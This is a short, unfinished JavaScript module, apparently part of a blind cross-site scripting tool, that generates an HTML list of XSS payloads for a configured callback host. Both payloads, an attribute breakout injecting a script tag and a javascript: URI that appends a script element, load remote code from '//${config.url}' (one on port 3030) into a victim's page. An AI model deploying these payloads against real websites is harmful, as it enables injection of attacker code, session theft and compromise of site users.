// TODO...
function buildPayloadStructure() {

}

exports.generatePayloads = (config) => {
  const payloads = `
  <h1> work in progress</h1> </br>
  <i>Simple Script:    <input value='"><script src="//${config.url}:3030/m"></script>'><br>
  <i>Simple JavaScript URI</i>:     <input value='javascript:eval("var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');_.setAttribute('src','//${config.url}/m');document.getElementsByTagName('body')[0].appendChild(_)")'></br>
  `;
  return payloads;
};
